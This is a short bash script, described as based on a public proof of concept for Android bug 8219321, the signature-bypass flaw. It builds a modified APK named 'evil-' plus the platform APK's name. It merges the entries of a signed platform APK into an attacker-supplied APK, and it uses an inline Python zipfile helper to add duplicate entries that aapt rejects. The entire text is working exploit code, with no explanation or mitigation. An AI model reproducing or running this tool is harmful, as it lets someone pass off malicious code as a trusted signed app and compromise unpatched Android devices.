#!/bin/bash
# Based on PoC for Android bug 8219321 by @pof
# Original version: https://github.com/poliva/random-scripts/blob/master/android/masterkey-apk-inject.sh

if [ $# != 2 ]; then echo "Usage: $0 <platform.apk> <inject.apk>" ; exit 1 ; fi

PLATFORM="$1"
INJECT="$2"

if [ ! -f "$PLATFORM" ]; then echo "ERROR: $PLATFORM does not exist" ; exit 1; fi
if [ ! -f "$INJECT" ]; then echo "ERROR: $INJECT does not exist" ; exit 1; fi

mkdir tmp
cd tmp
unzip ../$PLATFORM
cp ../$INJECT ./out.apk

cat >poc.py <<-EOF
#!/usr/bin/python
import zipfile 
import sys
z = zipfile.ZipFile(sys.argv[1], "a")
z.write(sys.argv[2])
z.close()
EOF
chmod 755 poc.py

for f in `find . -type f |sed -e "s:^\./::g" |egrep -v "(poc.py|out.apk)"` ; do aapt add -v out.apk "$f" ; if [ $? != 0 ]; then ./poc.py out.apk "$f" ; fi ; done

cp out.apk ../evil-${PLATFORM}
cd ..
rm -rf tmp
echo "Modified APK: evil-${PLATFORM}"
